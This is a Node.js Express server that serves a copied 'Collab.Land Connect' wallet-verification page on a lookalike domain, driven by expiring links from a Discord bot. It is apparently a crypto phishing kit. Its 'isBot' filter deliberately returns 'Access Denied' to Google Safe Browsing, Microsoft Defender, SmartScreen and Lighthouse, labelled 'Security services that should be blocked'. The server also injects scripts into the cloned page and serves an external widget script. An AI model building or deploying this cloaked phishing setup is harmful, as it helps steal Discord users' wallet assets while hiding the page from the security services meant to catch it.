// Node.js Express server - serves the HTML file
// Run this on your VPS with: node server.js
// Make sure to configure your web server (Apache/Nginx) to proxy requests to this server
// PHP files (like secureproxy.php) will be handled directly by the web server

require('dotenv').config();

const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const { generateCollabLandUrl, generateUrlParamsScript: sharedGenerateUrlParamsScript } = require('./update_html.js');

const app = express();
const PORT = process.env.PORT || 3000;
const HTML_FILE = "Collab.Land Connect (11_7_2025 5：13：46 PM) (1).html";
const EXPIRED_HTML_FILE = "link-expired.html";

// Middleware to parse JSON bodies
app.use(express.json());

// In-memory storage for OAuth session data (guild info)
// Key: session token, Value: { guildId, interactionId, communityName, guildIconHash, timestamp, createdAt }
const oauthSessions = new Map();

// Clean up old sessions every 10 minutes (sessions expire after 10 minutes)
setInterval(() => {
  const now = Date.now();
  const maxAge = 10 * 60 * 1000; // 10 minutes
  for (const [token, data] of oauthSessions.entries()) {
    if (now - data.createdAt > maxAge) {
      oauthSessions.delete(token);
      console.log(`[OAuth Session] Cleaned up expired session: ${token.substring(0, 8)}...`);
    }
  }
}, 10 * 60 * 1000);

/**
 * Generate a random session token
 */
function generateSessionToken() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 32; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// API endpoint for bot to store guild info and get session token
app.post('/api/oauth/session', (req, res) => {
  try {
    const { guildId, interactionId, communityName, guildIconHash, timestamp } = req.body;
    
    if (!guildId || !interactionId || !communityName) {
      return res.status(400).json({ error: 'Missing required fields: guildId, interactionId, communityName' });
    }
    
    // Generate session token
    const sessionToken = generateSessionToken();
    
    // Store session data
    oauthSessions.set(sessionToken, {
      guildId,
      interactionId,
      communityName,
      guildIconHash: guildIconHash || null,
      timestamp: timestamp || new Date().toISOString(),
      createdAt: Date.now()
    });
    
    console.log(`[OAuth Session] Created session for guild ${guildId} (${communityName}), token: ${sessionToken.substring(0, 8)}...`);
    
    res.json({ token: sessionToken });
  } catch (error) {
    console.error('[OAuth Session] Error creating session:', error);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

// List of hostnames that should have anti-bot protection
const PROTECTED_HOSTNAMES = [
  "collab.land-entry.app", // Add your custom domain here
  // Add more hostnames as needed
];

/**
 * Generate the URL parameter script that reads state and id from URL
 * and updates the page with personalized content
 */
function generateUrlParamsScript() {
  return sharedGenerateUrlParamsScript();
}

/**
 * Safely serialize data for inline script injection
 */
function serializeForInlineScript(data) {
  if (data === null || typeof data === 'undefined') {
    return 'null';
  }
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}

/**
 * Check if request is from a bot
 */
function isBot(userAgent, acceptLanguage, acceptEncoding) {
  const botPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i,
    /curl/i,
    /wget/i,
    /python/i,
    /java/i,
    /php/i,
    /go-http/i,
    /okhttp/i,
    /axios/i,
    /headless/i,
    /selenium/i,
    /puppeteer/i,
    /playwright/i,
    // Security services that should be blocked
    /google/i,
    /safebrowsing/i,
    /microsoft/i,
    /defender/i,
    /smartscreen/i,
    /windows defender/i,
    /microsoft defender/i,
    /google safebrowsing/i,
    /mozilla\/5\.0.*google/i,
    /mozilla\/5\.0.*microsoft/i,
    /chrome-lighthouse/i,
    /lighthouse/i,
    /page speed/i,
  ];

  const isBot =
    botPatterns.some((pattern) => pattern.test(userAgent)) ||
    !acceptLanguage ||
    !acceptEncoding ||
    userAgent.length < 10;

  return isBot;
}

// Root route - simple status page (OAuth no longer needed, using direct links)
app.get('/', (req, res) => {
  res.send(`
    <h1>Server is running!</h1>
    <p>Status: ✅ Online</p>
    <p>Connect wallet links go directly to <code>/evm?state=...&id=...</code></p>
  `);
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Serve static JavaScript files (like basewidget-4.7.3.js)
app.get('*.js', async (req, res) => {
  const fileName = req.path.substring(1); // Remove leading slash
  try {
    const filePath = path.join(__dirname, fileName);
    const fileContent = await fs.readFile(filePath);
    res.set({
      'content-type': 'application/javascript; charset=utf-8',
      'access-control-allow-origin': '*',
      'cache-control': 'public, max-age=3600',
    });
    res.send(fileContent);
  } catch (error) {
    console.error(`✗ Error serving static file ${fileName}:`, error.message);
    res.status(404).send(`File Not Found: ${fileName}\n\nMake sure the file exists in your project directory.`);
  }
});

// Handle /evm route for HTML
app.get('/evm', async (req, res) => {
  try {
    const hostname = req.get('host');
    
    // Anti-bot detection for protected hostnames
    if (PROTECTED_HOSTNAMES.includes(hostname)) {
      const userAgent = req.get('user-agent') || '';
      const acceptLanguage = req.get('accept-language') || '';
      const acceptEncoding = req.get('accept-encoding') || '';
      
      if (isBot(userAgent, acceptLanguage, acceptEncoding)) {
        return res.status(403).send('Access Denied');
      }
    }

    // Check for required parameters (state and id)
    const state = req.query.state;
    const id = req.query.id;

    // Require both state and id parameters
    if (!state || !id) {
      return res.status(400).send('Bad Request: Missing required parameters (state and id)');
    }

    // Validate parameters are not empty
    const stateTrimmed = state.trim();
    const idTrimmed = id.trim();
    if (stateTrimmed === '' || idTrimmed === '') {
      return res.status(400).send('Bad Request: Parameters cannot be empty');
    }

    // Validate state format (should be alphanumeric, reasonable length)
    if (!/^[A-Za-z0-9_-]{10,50}$/.test(stateTrimmed)) {
      return res.status(400).send('Bad Request: Invalid state parameter format');
    }

    // Validate id is valid base64
    let decodedPayload = null;
    let decodedData = null;
    try {
      if (!/^[A-Za-z0-9+/_-]+={0,2}$/.test(idTrimmed)) {
        return res.status(400).send('Bad Request: Invalid id parameter format (not valid base64)');
      }
      const standardBase64 = idTrimmed.replace(/-/g, '+').replace(/_/g, '/');
      decodedPayload = Buffer.from(standardBase64, 'base64').toString('utf-8');

      try {
        decodedData = JSON.parse(decodedPayload);
      } catch (parseError) {
        console.warn('Could not parse id payload JSON:', parseError.message);
        decodedData = null;
      }
    } catch (e) {
      return res.status(400).send('Bad Request: Invalid id parameter (cannot decode base64)');
    }

    // Determine expiration using decoded payload (if it is JSON)
    let linkExpired = false;
    if (decodedData) {
      const expirationMinutes = Number(decodedData.expirationMinutes || decodedData.em || 6);
      const expiresAtIso = decodedData.expiresAt || decodedData.exp;
      const timestampIso = decodedData.timestampIso || decodedData.ts;

      let expiresAtMs = null;
      if (expiresAtIso) {
        const parsed = Date.parse(expiresAtIso);
        if (!Number.isNaN(parsed)) {
          expiresAtMs = parsed;
        }
      }

      if (!expiresAtMs && timestampIso) {
        const createdAt = Date.parse(timestampIso);
        if (!Number.isNaN(createdAt)) {
          const durationMinutes = Number.isFinite(expirationMinutes) && expirationMinutes > 0 ? expirationMinutes : 6;
          expiresAtMs = createdAt + durationMinutes * 60 * 1000;
        }
      }

      if (expiresAtMs) {
        linkExpired = Date.now() >= expiresAtMs;
      }
    }

    if (linkExpired) {
      try {
        const expiredHtml = await fs.readFile(path.join(__dirname, EXPIRED_HTML_FILE), 'utf-8');
        res.set({
          'content-type': 'text/html; charset=utf-8',
          'cache-control': 'no-cache, no-store, must-revalidate',
          pragma: 'no-cache',
          expires: '0',
        });
        return res.status(410).send(expiredHtml);
      } catch (error) {
        console.error('Failed to load expiration page:', error.message);
        return res.status(410).send('This verification link has expired. Please return to Discord and request a new one.');
      }
    }

    // Serve HTML file only if all requirements are met
    const filePath = path.join(__dirname, HTML_FILE);
    let html = await fs.readFile(filePath, 'utf-8');
    
    // Check if basewidget script exists in HTML
    const hasBasewidget = html.includes('basewidget-4.7.3.js');
    
    // Fix relative script paths to absolute paths (e.g., ./basewidget-4.7.3.js -> /basewidget-4.7.3.js)
    html = html.replace(/src=["']\.\/([^"']+)["']/g, 'src="/$1"');
    
    // Verify the script tag is still there after path replacement
    const hasBasewidgetAfter = html.includes('basewidget-4.7.3.js');
    console.log(`Basewidget script tag found after path fix: ${hasBasewidgetAfter}`);
    if (hasBasewidget && !hasBasewidgetAfter) {
      console.warn('WARNING: Basewidget script tag was removed during path replacement!');
    }
    
    // Always inject the script (remove old one if exists, then add new one)
    console.log('Preparing HTML with URL parameter script...');
    
    // Remove any existing script we may have injected before
    html = html.replace(/<style>[\s\S]*?\.sc-iqPaeV\.ijefWr[\s\S]*?<\/style>/g, '');
    html = html.replace(/<script>[\s\S]*?URLSearchParams[\s\S]*?createPersonalizedCard[\s\S]*?<\/script>/g, '');
    
    // Generate the URL parameter script
    const urlParamsScript = generateUrlParamsScript();
    const payloadScriptTag = `<script id="collab-land-payload-data">window.__COLLAB_LAND_PAYLOAD__ = ${serializeForInlineScript(decodedData)};</script>`;
    
    // Try multiple injection points
    if (html.includes('</body>')) {
      html = html.replace('</body>', `${payloadScriptTag}\n${urlParamsScript}\n</body>`);
    } else if (html.includes('</html>')) {
      html = html.replace('</html>', `${payloadScriptTag}\n${urlParamsScript}\n</html>`);
    } else if (html.includes('</script>')) {
      const lastScriptIndex = html.lastIndexOf('</script>');
      if (lastScriptIndex !== -1) {
        const insertPos = lastScriptIndex + '</script>'.length;
        html = html.slice(0, insertPos) + '\n' + payloadScriptTag + '\n' + urlParamsScript + html.slice(insertPos);
      } else {
        html += payloadScriptTag + '\n' + urlParamsScript;
      }
    } else {
      html += payloadScriptTag + '\n' + urlParamsScript;
    }
    
    // Final verification: Ensure basewidget script is in the final HTML
    const finalCheck = html.includes('basewidget-4.7.3.js');
    console.log(`Final check - basewidget script in served HTML: ${finalCheck}`);
    if (!finalCheck && hasBasewidget) {
      console.error('ERROR: Basewidget script was lost during processing! Adding it back...');
      if (html.includes('</head>')) {
        html = html.replace('</head>', '<script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script></head>');
      } else if (html.includes('<head>')) {
        html = html.replace('<head>', '<head><script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script>');
      } else {
        html = html.replace(/<html[^>]*>/, '$&<script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script>');
      }
    }
    
    res.set({
      'content-type': 'text/html; charset=utf-8',
      'access-control-allow-origin': '*',
      'cache-control': 'no-cache, no-store, must-revalidate',
      'pragma': 'no-cache',
      'expires': '0',
    });
    res.send(html);
  } catch (error) {
    console.error('Error serving file:', error);
    res.status(500).send(`Error: ${error.message}`);
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📄 HTML file: ${HTML_FILE}`);
  console.log(`🌐 Access at: http://localhost:${PORT}/evm?state=XXX&id=YYY`);
});


